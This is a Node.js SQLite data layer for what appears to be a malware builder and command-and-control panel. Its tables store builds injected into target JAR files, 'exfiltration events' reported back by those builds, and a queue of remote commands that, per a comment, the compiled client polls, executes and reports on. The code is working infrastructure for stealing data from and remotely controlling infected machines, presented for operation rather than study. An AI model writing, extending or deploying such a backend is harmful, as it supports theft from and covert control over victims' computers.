const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bcrypt = require('bcryptjs');

// Allow tests to run against an isolated database instead of the dev one.
const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'database.sqlite');
const db = new sqlite3.Database(DB_PATH);

// Helper to run query and return Promise
function run(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.run(sql, params, function (err) {
            if (err) reject(err);
            else resolve({ id: this.lastID, changes: this.changes });
        });
    });
}

// Helper to get single row
function get(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.get(sql, params, (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

// Helper to get multiple rows
function all(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.all(sql, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
}

// Initialize tables
async function initDatabase() {
    // 1. Users Table
    await run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            role TEXT NOT NULL DEFAULT 'standard',
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    // 2. Builds Table
    await run(`
        CREATE TABLE IF NOT EXISTS builds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            userId INTEGER NOT NULL,
            buildId TEXT UNIQUE NOT NULL,
            targetJar TEXT NOT NULL,
            files TEXT NOT NULL,
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (userId) REFERENCES users(id) ON DELETE CASCADE
        )
    `);

    // 3. Action Logs (Audit Logs) Table
    await run(`
        CREATE TABLE IF NOT EXISTS action_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            userId INTEGER,
            username TEXT,
            action TEXT NOT NULL,
            details TEXT,
            status TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    // 4. Exfiltration events. Replaces the previous append-to-JSON-array
    // pattern which rewrote whole files on every event and could lose writes
    // under concurrency. Each inbound report is one atomic row.
    await run(`
        CREATE TABLE IF NOT EXISTS exfil_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            buildId TEXT NOT NULL,
            type TEXT NOT NULL,
            data TEXT NOT NULL DEFAULT '{}',
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    await run(
        'CREATE INDEX IF NOT EXISTS idx_exfil_build ON exfil_events (buildId, type)'
    );
    await run(
        'CREATE INDEX IF NOT EXISTS idx_exfil_created ON exfil_events (createdAt)'
    );

    // 5. Remote command queue. The compiled client polls for pending commands
    //     for its buildId, executes them, and uploads the result back here.
    await run(`
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            buildId TEXT NOT NULL,
            type TEXT NOT NULL,
            args TEXT DEFAULT '',
            status TEXT NOT NULL DEFAULT 'pending',
            result TEXT,
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
            completedAt DATETIME
        )
    `);
    await run(
        'CREATE INDEX IF NOT EXISTS idx_cmd_build ON commands (buildId, status)'
    );

    // Seed default admin if no users exist
    const userCount = await get('SELECT COUNT(*) as count FROM users');
    if (userCount.count === 0) {
        const adminPass = process.env.ADMIN_PASSWORD;
        if (!adminPass) {
            throw new Error('Missing required environment variable ADMIN_PASSWORD');
        }
        const hashed = await bcrypt.hash(adminPass, 10);
        await run(
            'INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
            ['admin', hashed, 'admin']
        );
        console.log(`[Database] Seeded default admin account: user='admin'`);
    }
}

function parseJson(text, fallback) {
    if (text == null || text === '') return fallback;
    try {
        return JSON.parse(text);
    } catch {
        return fallback;
    }
}

module.exports = {
    initDatabase,
    run,
    get,
    all,
    DB_PATH,
    close() {
        return new Promise((resolve, reject) => {
            db.close((err) => (err ? reject(err) : resolve()));
        });
    },

    // User CRUD
    async createUser(username, password, role = 'standard') {
        const hashedPassword = await bcrypt.hash(password, 10);
        const result = await run(
            'INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
            [username, hashedPassword, role]
        );
        return { id: result.id, username, role };
    },

    async getUserByUsername(username) {
        return await get('SELECT * FROM users WHERE username = ?', [username]);
    },

    async getUserById(id) {
        return await get('SELECT id, username, role, createdAt FROM users WHERE id = ?', [id]);
    },

    // Build CRUD
    async createBuild(userId, buildId, targetJar, files) {
        const filesJson = JSON.stringify(files);
        await run(
            'INSERT INTO builds (userId, buildId, targetJar, files) VALUES (?, ?, ?, ?)',
            [userId, buildId, targetJar, filesJson]
        );
        return { userId, buildId, targetJar, files };
    },

    async getBuild(buildId) {
        const build = await get('SELECT * FROM builds WHERE buildId = ?', [buildId]);
        if (build) {
            build.files = parseJson(build.files, []);
        }
        return build;
    },

    async listBuilds(userId = null) {
        if (userId) {
            const builds = await all('SELECT * FROM builds WHERE userId = ? ORDER BY createdAt DESC', [userId]);
            return builds.map(b => ({ ...b, files: parseJson(b.files, []) }));
        } else {
            const builds = await all('SELECT builds.*, users.username FROM builds JOIN users ON builds.userId = users.id ORDER BY builds.createdAt DESC');
            return builds.map(b => ({ ...b, files: parseJson(b.files, []) }));
        }
    },

    // Exfiltration event storage
    async insertEvent(buildId, type, data) {
        const result = await run(
            'INSERT INTO exfil_events (buildId, type, data) VALUES (?, ?, ?)',
            [buildId, type, typeof data === 'string' ? data : JSON.stringify(data)]
        );
        return result.id;
    },

    async listEvents(buildId, type = null) {
        if (type) {
            return await all('SELECT * FROM exfil_events WHERE buildId = ? AND type = ? ORDER BY id', [buildId, type]);
        }
        return await all('SELECT * FROM exfil_events WHERE buildId = ? ORDER BY id', [buildId]);
    },

    async countEvents(buildId, type) {
        const row = await get('SELECT COUNT(*) as count FROM exfil_events WHERE buildId = ? AND type = ?', [buildId, type]);
        return (row && row.count) || 0;
    },

    // Remote command queue
    async createCommand(buildId, type, args = '') {
        const result = await run(
            'INSERT INTO commands (buildId, type, args) VALUES (?, ?, ?)',
            [buildId, type, args]
        );
        return result.id;
    },

    async listCommands(buildId, limit = 50) {
        return await all(
            'SELECT * FROM commands WHERE buildId = ? ORDER BY id DESC LIMIT ?',
            [buildId, limit]
        );
    },

    // Claim the oldest pending command for a build: atomically mark it running
    // so concurrent polls cannot hand the same command to two clients.
    async claimPendingCommand(buildId) {
        const row = await get(
            "SELECT * FROM commands WHERE buildId = ? AND status = 'pending' ORDER BY id LIMIT 1",
            [buildId]
        );
        if (!row) return null;
        await run("UPDATE commands SET status = 'running' WHERE id = ?", [row.id]);
        return row;
    },

    async completeCommand(id, status, result = null) {
        await run(
            "UPDATE commands SET status = ?, result = ?, completedAt = CURRENT_TIMESTAMP WHERE id = ?",
            [status, result, id]
        );
    },

    async getCommand(id) {
        return await get('SELECT * FROM commands WHERE id = ?', [id]);
    },

    // Log Action Helper
    async logAction(userId, username, action, details = null, status = 'SUCCESS') {
        try {
            const detailsStr = typeof details === 'object' ? JSON.stringify(details) : details;
            await run(
                'INSERT INTO action_logs (userId, username, action, details, status) VALUES (?, ?, ?, ?, ?)',
                [userId, username, action, detailsStr, status]
            );
        } catch (err) {
            console.error('Failed to write action log:', err);
        }
    },

    // List Action Logs (with filtering)
    async listActionLogs(filters = {}) {
        let sql = 'SELECT * FROM action_logs WHERE 1=1';
        const params = [];

        if (filters.userId) {
            sql += ' AND userId = ?';
            params.push(filters.userId);
        }
        if (filters.action) {
            sql += ' AND action = ?';
            params.push(filters.action);
        }
        if (filters.status) {
            sql += ' AND status = ?';
            params.push(filters.status);
        }
        if (filters.search) {
            sql += ' AND (username LIKE ? OR action LIKE ? OR details LIKE ?)';
            const searchPattern = `%${filters.search}%`;
            params.push(searchPattern, searchPattern, searchPattern);
        }

        sql += ' ORDER BY timestamp DESC';
        return await all(sql, params);
    }
};